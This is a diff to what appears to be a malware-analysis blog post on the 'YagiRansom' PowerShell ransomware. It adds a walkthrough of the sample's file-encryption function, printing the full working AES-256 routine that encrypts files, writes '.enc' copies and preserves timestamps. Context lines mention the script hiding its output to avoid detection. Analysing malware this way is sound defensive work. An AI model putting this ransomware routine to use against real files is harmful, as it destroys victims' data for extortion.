@@ -317,7 +317,7 @@ else {
 sleep 1000 ; Write-Host "[i] Done!" -ForegroundColor Green ; Write-Host
 BSJB
 ```
-#### PowerShell code block analysis
+### PowerShell code block analysis
 - Section:
    - `#Design`: Suppresses the PowerShell errors and messages to avoid detection, detects if the system is Windows or not. If the system is Windows, changes the terminal to `YagiRansom` and changes the background to black and foreground to white.
    - `#Error`: Checks if all the required parameters are provided; if not, prints an error and exits.
@@ -350,3 +350,95 @@ BSJB
 {: .prompt-tip}
 
 Let's analyze each function more carefully
+#### AESEncryption
+```powershell
+function Invoke-AESEncryption {
+   [CmdletBinding()]
+   [OutputType([string])]
+   Param(
+       [Parameter(Mandatory = $true)]
+       [String]$Key,
+       [Parameter(Mandatory = $true, ParameterSetName = "CryptText")]
+       [String]$Text,
+       [Parameter(Mandatory = $true, ParameterSetName = "CryptFile")]
+       [String]$Path)
+   Begin {
+      $m95I = New-Object System.Security.Cryptography.SHA256Managed
+      $n9ibn = New-Object System.Security.Cryptography.AesManaged
+      $n9ibn.Mode = [System.Security.Cryptography.CipherMode]::CBC
+      $n9ibn.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
+      $n9ibn.BlockSize = 128
+      $n9ibn.KeySize = 256 }
+   Process {
+      $n9ibn.Key = $m95I.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($Key))
+      if ($Text) {$plainBytes = [System.Text.Encoding]::UTF8.GetBytes($Text)}
+      if ($Path) {
+         $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
+         if (!$File.FullName) { break }
+         $plainBytes = [System.IO.File]::ReadAllBytes($File.FullName)
+         $outPath = $File.FullName + ".enc" }
+      $encryptor = $n9ibn.CreateEncryptor()
+      $encryptedBytes = $encryptor.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)
+      $encryptedBytes = $n9ibn.IV + $encryptedBytes
+      $n9ibn.Dispose()
+      if ($Text) {return [System.Convert]::ToBase64String($encryptedBytes)}
+      if ($Path) {
+         [System.IO.File]::WriteAllBytes($outPath, $encryptedBytes)
+         (Get-Item $outPath).LastWriteTime = $File.LastWriteTime }}
+  End {
+      $m95I.Dispose()
+      $n9ibn.Dispose()}}
+```
+
+- Param block:
+  ```powershell
+  Param(
+       [Parameter(Mandatory = $true)]
+       [String]$Key,
+       [Parameter(Mandatory = $true, ParameterSetName = "CryptText")]
+       [String]$Text,
+       [Parameter(Mandatory = $true, ParameterSetName = "CryptFile")]
+       [String]$Path)
+   ```
+  - `$Key` for encrypt and decrypt.
+  - `$Text` is plaintext to encrypt.
+  - `$Path` is path to file to encrypt.
+- Begin block:
+  ```powershell
+  Begin {
+      $m95I = New-Object System.Security.Cryptography.SHA256Managed
+      $n9ibn = New-Object System.Security.Cryptography.AesManaged
+      $n9ibn.Mode = [System.Security.Cryptography.CipherMode]::CBC
+      $n9ibn.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
+      $n9ibn.BlockSize = 128
+      $n9ibn.KeySize = 256 }
+   ```
+   - Create SHA256 hash 
+   - Set AES encryption to `CBC` with `PKCS7` and `256 bit` key. Block Size is `128 bit`
+- Process block:
+  ```powershell
+  Process {
+      $n9ibn.Key = $m95I.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($Key))
+      if ($Text) {$plainBytes = [System.Text.Encoding]::UTF8.GetBytes($Text)}
+      if ($Path) {
+         $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
+         if (!$File.FullName) { break }
+         $plainBytes = [System.IO.File]::ReadAllBytes($File.FullName)
+         $outPath = $File.FullName + ".enc" }
+      $encryptor = $n9ibn.CreateEncryptor()
+      $encryptedBytes = $encryptor.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)
+      $encryptedBytes = $n9ibn.IV + $encryptedBytes
+      $n9ibn.Dispose()
+      if ($Text) {return [System.Convert]::ToBase64String($encryptedBytes)}
+      if ($Path) {
+         [System.IO.File]::WriteAllBytes($outPath, $encryptedBytes)
+         (Get-Item $outPath).LastWriteTime = $File.LastWriteTime }}
+   ```
+   - First it hashes the `$Key` using `SHA-256` and stores it in `$n9ibn`
+   - If `$Text` is provided, it encrypts it
+   - If `$Path` is provided, it reads the file's bytes and encrypts them
+   - It creates an AES Encryptor with the key and a random IV
+   - Encrypts the plaintext bytes and stores them in `$encryptedBytes`
+   - The IV is added to the encrypted data
+   - Clean up AES resources
+   
